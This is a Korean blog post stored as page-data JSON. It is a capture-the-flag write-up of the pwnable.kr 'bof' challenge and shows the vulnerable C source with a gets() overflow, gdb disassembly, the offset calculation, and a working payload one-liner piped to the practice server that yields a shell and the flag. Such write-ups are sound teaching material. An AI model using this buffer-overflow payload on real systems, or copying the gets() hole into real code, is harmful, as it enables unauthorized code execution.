{"componentChunkName":"component---src-templates-blog-post-tsx","path":"/articles/2016-03/Pwnable.kr-bof","result":{"data":{"site":{"siteMetadata":{"title":"GyeongSu Han's Github Pages","author":"@micalgenus","siteUrl":"https://micalgenus.github.io"}},"markdownRemark":{"id":"bd80186f-b289-5c68-8ba5-3fa687738796","html":"<p>bof문제의 파일을 읽어보면 다음과 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> overflowme<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"overflow me : \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>overflowme<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// smash me!</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>key <span class=\"token operator\">==</span> <span class=\"token number\">0xcafebabe</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nah..\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>func함수에서 <code class=\"language-text\">gets</code>의 취약점을 이용하여 overflow를 수행하는 문제이다. 이 프로그램을 파악해 보면 다음과 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">gdb-peda$ pdisas func\nDump of assembler code for function func:\n   0x0000062c &lt;+0>:    push   ebp\n   0x0000062d &lt;+1>:    mov    ebp,esp\n   0x0000062f &lt;+3>:    sub    esp,0x48\n   0x00000632 &lt;+6>:    mov    eax,gs:0x14\n   0x00000638 &lt;+12>:    mov    DWORD PTR [ebp-0xc],eax\n   0x0000063b &lt;+15>:    xor    eax,eax\n   0x0000063d &lt;+17>:    mov    DWORD PTR [esp],0x78c ; \"overflow me : \"\n   0x00000644 &lt;+24>:    call   printf\n   0x00000649 &lt;+29>:    lea    eax,[ebp-0x2c] ; char overflowme[32]\n   0x0000064c &lt;+32>:    mov    DWORD PTR [esp],eax\n   0x0000064f &lt;+35>:    call   gets\n   0x00000654 &lt;+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe\n ...</code></pre></div>\n<p>먼저 <code class=\"language-text\">call printf</code>를 수행한다. 그 후 <code class=\"language-text\">gets</code>를 호출한다. 이 때 <code class=\"language-text\">ebp - 0x2c</code>의 위치에 <strong>overflowme</strong>라는 배열이 들어있음을 확인할 수 있다.</p>\n<p>그 후 <code class=\"language-text\">ebp + 0x8</code>의 값과 0xcafebabe를 비교한다. overflow시켜야할 총 데이터는 0x2c + 0x8의 값을 덮어쓰고, 그 후에 원하는 데이터를 덮어야 한다.</p>\n<p>값은 <strong>리틀엔디안</strong>이므로 반대로 넣어주면 된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">ubuntu@ubuntu:~$ <span class=\"token punctuation\">(</span>python -c <span class=\"token string\">'print \"A\" * 52 + \"\\xbe\\xba\\xfe\\xca\"'</span><span class=\"token punctuation\">;</span><span class=\"token function\">cat</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token function\">nc</span> pwnable.kr <span class=\"token number\">9000</span>\n<span class=\"token function\">ls</span>\nbof\nbof.c\nflag\nlog\nsuper.pl\n<span class=\"token function\">cat</span> flag\ndaddy, I just pwned a buFFer <span class=\"token builtin class-name\">:</span><span class=\"token punctuation\">)</span></code></pre></div>","frontmatter":{"categories":["Wargame"],"title":"Pwnable.kr bof","date":"Mar 26, 2016","tags":["Pwnable.kr"]}}},"pageContext":{"comments":true,"previous":{"frontmatter":{"path":"/articles/2016-03/FTZ-level7","title":"FTZ Level7","comments":true}},"next":{"frontmatter":{"path":"/articles/2016-03/Pwnable.kr-collision","title":"Pwnable.kr collision","comments":true}}}}}